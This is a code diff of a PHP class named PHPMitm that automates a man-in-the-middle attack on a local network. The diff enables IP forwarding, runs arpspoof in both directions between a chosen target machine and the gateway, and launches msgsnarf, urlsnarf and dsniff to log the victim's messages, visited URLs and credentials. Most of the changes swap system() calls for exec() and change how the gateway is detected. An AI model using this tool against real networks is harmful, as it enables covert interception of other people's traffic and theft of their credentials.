@@ -22,8 +22,8 @@
 
 
 
-require_once './PHPMitmDaemon.php';
-require_once './PHPMitmException.php';
+#require_once './PHPMitmDaemon.php';
+require_once './PHPMitm_Exception.php';
 
 
 class PHPMitm {
@@ -93,7 +93,7 @@ class PHPMitm {
      * @param string $gw
      */
     public function set_DefaultGateway($gw=NULL){
-        ($gw == NULL) ? $this->_default_gateway = trim(shell_exec("route -vn |tail -1| awk -F ' ' '{print $2}'")) : $this->_default_gateway = $gw;
+        ($gw == NULL) ? $this->_default_gateway = trim(shell_exec("route -vn |head |awk -F ' '  '$2 != \"0.0.0.0\" && $2 != \"IP\"  && $2 != \"Gateway\" {print $2}'")) : $this->_default_gateway = $gw;
     }
 
     /**
@@ -234,19 +234,19 @@ class PHPMitm {
 
 
         # Enable packet forwarding on your attacking machine
-        system('echo "1" > /proc/sys/net/ipv4/ip_forward', $status);
-        if($status != 0) {
+        exec('echo "1" > /proc/sys/net/ipv4/ip_forward', $ip_forwar_out, $ip_forward_status);
+        if($ip_forward_status != 0) {
             throw new PHPMitm_Exception("Unable to set host in forwarding mode. Are you root?\n");
         }
 
-        system('arpspoof -i ' . self::get_NetworkInterface() . ' -t ' . self::get_DefaultGateway() . ' ' . self::get_TargetMachine() . ' > /dev/null 2> /var/log/php_sniffer.log &', $status);
-        if($status != 0) {
+        exec('arpspoof -i ' . self::get_NetworkInterface() . ' -t ' . self::get_DefaultGateway() . ' ' . self::get_TargetMachine() . ' > /dev/null 2> /var/log/php_sniffer.log &', $arpspoof_out, $arpspoof_status);
+        if($arpspoof_status != 0) {
             throw new PHPMitm_Exception("Unable to setup arpspoof. See /var/log/php_sniffer.log for details.\n");
         }
 
         # Enable the reverse arpspoof
-        system('arpspoof -i ' . self::get_NetworkInterface() . ' -t '. self::get_TargetMachine() . ' '. self::get_DefaultGateway() . '> /dev/null 2> /var/log/php_sniffer.log &', $status);
-        if($status != 0) {
+        exec('arpspoof -i ' . self::get_NetworkInterface() . ' -t '. self::get_TargetMachine() . ' '. self::get_DefaultGateway() . '> /dev/null 2> /var/log/php_sniffer.log &', $reverse_arpspoof_out, $reverse_arpspoof_status);
+        if($reverse_arpspoof_status != 0) {
             throw new PHPMitm_Exception("Unable to set reverse arpspoof. See /var/log/php_sniffer.log for details.\n");
         }
     }
@@ -265,9 +265,9 @@ class PHPMitm {
         }
 
         #System_Daemon::start();
-            system("msgsnarf -i $iface >> $dir/php_mitm-msgsnarf.txt &");
-            system("urlsnarf -i $iface >> $dir/php_mitm-urlsnarf.txt &");
-            system("dsniff -i $iface >> $dir/php_mitm-dniff.txt &");
+            exec("msgsnarf -i $iface >> $dir/php_mitm-msgsnarf.txt &");
+            exec("urlsnarf -i $iface >> $dir/php_mitm-urlsnarf.txt &");
+            exec("dsniff -i $iface >> $dir/php_mitm-dniff.txt &");
         #System_Daemon::stop();
         echo 'Nancy' . "\n";
     }
